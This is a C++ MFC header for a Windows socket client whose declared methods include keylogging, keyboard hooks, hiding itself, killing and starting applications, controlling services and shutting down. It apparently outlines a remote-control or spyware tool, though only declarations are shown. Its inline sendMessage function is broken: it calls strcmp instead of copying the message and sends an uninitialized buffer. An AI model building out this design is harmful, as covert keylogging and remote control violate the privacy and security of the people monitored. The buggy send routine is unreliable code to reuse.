
// GUI_Client2.h : main header file for the PROJECT_NAME application
//

#pragma once

#ifndef __AFXWIN_H__
	#error "include 'stdafx.h' before including this file for PCH"
#endif

#include "resource.h"		// main symbols
#include <afxsock.h>
#include <string>
using namespace std;
// CGUI_Client2App:
// See GUI_Client2.cpp for the implementation of this class
//

class CGUI_Client2App : public CWinApp
{
private:
	CSocket client;
public:
	string hookdata;
	bool isHooked;
	
public:
	CGUI_Client2App();

// Overrides
public:
	virtual BOOL InitInstance();

// Implementation
	void connect(CDialog* dlg);
	void mainloop(CDialog* dlg);
	void disconnect(CDialog* dlg);
	void shutdown(CDialog* dlg);
	void keylog(CDialog* dlg);
	void seeapp(CDialog* dlg);
	void startapp(CDialog* dlg);
	void killapp(CDialog* dlg);
	void seeservice(CDialog* dlg);
	void startserivce(CDialog* dlg);
	void stopservice(CDialog* dlg);
	void startHook(CDialog* dlg);
	void stopHook(CDialog* dlg);
	void getHook(CDialog* dlg);
	
	void hide(CDialog* dlg);

	void sendMessage(CSocket& sock, char* message){
		char temp[100];
		strcmp(temp, message);
		sock.Send(temp, 100, 0);
	}
	void sendFeedback(char* message);
	int receiveExactlyNByte(char* buffer, int nByte);

	DECLARE_MESSAGE_MAP()
};

extern CGUI_Client2App theApp;